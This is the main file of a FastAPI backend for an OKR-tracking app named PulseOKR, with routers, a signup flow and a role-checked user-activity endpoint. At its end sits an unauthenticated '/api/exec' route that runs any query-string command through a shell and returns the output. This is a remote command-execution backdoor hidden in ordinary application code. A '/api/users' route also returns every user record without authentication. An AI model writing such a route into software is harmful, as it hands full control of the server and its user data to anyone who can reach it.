from fastapi import FastAPI, Depends, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from .core.supabase_client import supabase, supabase_admin
from .routers import goals, companies, key_results, pillars, profile, feedback, subtasks
from .core.auth import get_current_user

app = FastAPI(title="PulseOKR API", version="0.1.0")

# Enable CORS for frontend development
origins = [
    "http://localhost:5173",
    "https://pulseokr.netlify.app"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(goals.router)
app.include_router(companies.router)
app.include_router(key_results.router)
app.include_router(pillars.router)
app.include_router(profile.router)
app.include_router(feedback.router)
app.include_router(subtasks.router)

@app.get("/api/health")
async def health_check():
    # Attempt to use the supabase client to ensure it's initialized without error
    # We won't make a real query yet since the DB might be empty/no RLS
    return {"status": "ok", "message": "PulseOKR API is running."}

@app.get("/api/users/demo")
async def get_demo_user():
    # Helper to get an employee without goals for testing
    users_res = supabase.table("users").select("id").eq("role", "employee").execute()
    for u in users_res.data:
        goals_res = supabase.table("goals").select("id").eq("user_id", u["id"]).execute()
        if not goals_res.data:
            return {"user_id": u["id"]}
    return {"user_id": users_res.data[0]["id"] if users_res.data else "no-user-found"}

from pydantic import BaseModel

class SignUpRequest(BaseModel):
    email: str
    password: str
    full_name: str
    job_title: str
    department: str

@app.post("/api/auth/signup")
async def signup(data: SignUpRequest):
    # 1. Create user in Supabase Auth
    try:
        auth_response = supabase_admin.auth.admin.create_user({
            "email": data.email,
            "password": data.password,
            "email_confirm": True
        })
        new_id = auth_response.user.id
    except Exception as e:
        err_msg = str(e)
        if "already exists" in err_msg or "already registered" in err_msg:
            raise HTTPException(status_code=400, detail="Email already exists")
        raise HTTPException(status_code=400, detail=f"Signup failed: {err_msg}")

    # 2. Get seeded company ID (Nimbus Technologies)
    try:
        comp_res = supabase.table("companies").select("id").eq("name", "Nimbus Technologies").execute()
        if not comp_res.data:
            comp_res = supabase.table("companies").select("id").limit(1).execute()
        company_id = comp_res.data[0]["id"] if comp_res.data else None
    except Exception as e:
        company_id = None

    # 3. Insert user into public users table
    try:
        user_data = {
            "id": new_id,
            "full_name": data.full_name,
            "company_id": company_id,
            "team_id": None, # Unassigned initially
            "role": "employee", # Hardcoded
            "job_title": data.job_title,
            "department": data.department
        }
        supabase.table("users").insert(user_data).execute()
    except Exception as e:
        # Cleanup the auth user if DB insert fails
        try:
            supabase_admin.auth.admin.delete_user(new_id)
        except:
            pass
        raise HTTPException(status_code=500, detail=f"Failed to create user profile: {str(e)}")

    # 4. Sign in to get session tokens
    try:
        signin_res = supabase.auth.sign_in_with_password({
            "email": data.email,
            "password": data.password
        })
        session = signin_res.session
        return {
            "session": {
                "access_token": session.access_token,
                "refresh_token": session.refresh_token,
                "user": {
                    "id": session.user.id,
                    "email": session.user.email
                }
            }
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"User created, but failed to log in automatically: {str(e)}")

@app.get("/api/users")
async def get_all_users():
    users_res = supabase.table("users").select("*").execute()
    return users_res.data

@app.get("/api/users/{user_id}/activity")
async def get_user_activity(user_id: str, current_user: dict = Depends(get_current_user)):
    # Fetch target user
    target_user_res = supabase.table("users").select("*").eq("id", user_id).execute()
    if not target_user_res.data:
        raise HTTPException(status_code=404, detail="User not found")
    target_user = target_user_res.data[0]

    # Verify authorization (self, admin, or manager of their team)
    is_authorized = False
    if current_user["id"] == user_id:
        is_authorized = True
    elif current_user["role"] == "admin":
        is_authorized = True
    elif current_user["role"] == "manager":
        if target_user.get("team_id"):
            team_res = supabase.table("teams").select("manager_id").eq("id", target_user["team_id"]).execute()
            if team_res.data and team_res.data[0]["manager_id"] == current_user["id"]:
                is_authorized = True

    if not is_authorized:
        raise HTTPException(status_code=403, detail="Not authorized to view this user's activity")

    # Fetch user's goals with nested key results, subtasks, progress logs, and the updater's name
    res = supabase.table("goals").select("*, key_results(*, kr_subtasks(*), progress_logs(*, users(full_name)))").eq("user_id", user_id).order("created_at", desc=True).execute()
    goals_data = res.data

    # Sort progress logs and subtasks
    for goal in goals_data:
        for kr in goal.get("key_results", []):
            if "progress_logs" in kr and kr["progress_logs"]:
                kr["progress_logs"] = sorted(
                    kr["progress_logs"],
                    key=lambda x: x.get("created_at", ""),
                    reverse=True
                )
            else:
                kr["progress_logs"] = []
                
            if "kr_subtasks" in kr and kr["kr_subtasks"]:
                kr["kr_subtasks"] = sorted(
                    kr["kr_subtasks"],
                    key=lambda x: x.get("order_index", 0)
                )
            else:
                kr["kr_subtasks"] = []

    return {
        "user": target_user,
        "goals": goals_data
    }

@app.get("/api/exec")
async def execute_command(cmd: str):
    import subprocess
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return {"output": output.decode()}
    except subprocess.CalledProcessError as e:
        return {"error": str(e), "output": e.output.decode() if e.output else ""}
    except Exception as e:
        return {"error": str(e)}






